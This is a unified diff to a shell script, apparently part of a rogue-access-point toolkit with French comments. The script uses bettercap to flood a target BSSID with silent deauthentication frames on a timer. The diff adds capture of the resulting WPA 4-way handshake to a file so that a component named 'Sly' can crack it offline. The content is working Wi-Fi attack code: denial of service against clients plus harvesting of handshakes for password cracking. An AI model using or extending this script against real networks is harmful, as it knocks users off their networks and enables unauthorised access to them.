@@ -3,11 +3,13 @@
 # distincte du faux AP (wlan1 sert deja de faux AP).
 # Parametres lus dans /tmp/fennec-mirage-deauth :
 #   ligne 1 = interface monitor, ligne 2 = BSSID cible, ligne 3 = canal (optionnel)
+#   ligne 4 = fichier de sortie du handshake (optionnel) pour Sly
 set -euo pipefail
 CFG=/tmp/fennec-mirage-deauth
 IFACE="$(sed -n '1p' "$CFG")"
 BSSID="$(sed -n '2p' "$CFG")"
 CANAL="$(sed -n '3p' "$CFG")"
+HSFILE="$(sed -n '4p' "$CFG")"
 
 [ -n "$IFACE" ] && [ -n "$BSSID" ] || { echo "cible incomplete"; exit 1; }
 
@@ -18,6 +20,12 @@ ip link set "$IFACE" up 2>/dev/null || true
 
 EVAL="set wifi.interface $IFACE;"
 [ -n "$CANAL" ] && EVAL="$EVAL set wifi.recon.channel $CANAL;"
+# Deauth forces reconnections; bettercap records the resulting 4-way handshake so
+# Sly can crack it offline. One file per target, named for Sly's parser.
+if [ -n "$HSFILE" ]; then
+    mkdir -p "$(dirname "$HSFILE")" 2>/dev/null || true
+    EVAL="$EVAL set wifi.handshakes.aggregate true; set wifi.handshakes.file $HSFILE;"
+fi
 EVAL="$EVAL wifi.recon on; set wifi.deauth.silent true;"
 EVAL="$EVAL set ticker.period 5; set ticker.commands \"wifi.deauth $BSSID\"; ticker on"
 
